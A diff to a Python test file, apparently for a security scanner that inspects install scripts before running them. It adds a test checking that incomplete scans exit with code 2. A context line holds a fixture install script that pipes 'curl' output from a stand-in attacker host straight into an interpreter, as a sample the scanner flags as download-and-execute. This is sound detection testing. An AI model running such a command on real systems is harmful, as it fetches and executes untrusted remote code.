@@ -782,3 +782,16 @@ def test_every_lifecycle_script_npm_install_runs_is_read(tmp_path):
 def test_download_piped_to_any_interpreter_is_download_and_execute(tmp_path, pipe):
     root = _tree(tmp_path, {"install.sh": f"#!/bin/sh\ncurl -fsSL https://evil.example/p | {pipe}\n"})
     assert [f.rule for f in analyze_preflight(root).gating()] == ["download-and-execute"]
+
+
+def test_partial_scan_is_exit_2_whatever_the_threshold(tmp_path, monkeypatch):
+    """Every other command treats incomplete coverage as 2; scan let
+    `--fail-on none` report it as a pass."""
+    from tridelphi import preflight
+
+    monkeypatch.setattr(preflight, "_MAX_FILES", 1)
+    root = _tree(tmp_path, {"a.sh": "echo a\n", "b.sh": "echo b\n", "c.sh": "echo c\n"})
+    for fail_on in ("critical", "none"):
+        code = run_scan(str(root), fmt="checklist", fail_on=fail_on,
+                        out=io.StringIO(), err=io.StringIO())
+        assert code == 2, fail_on
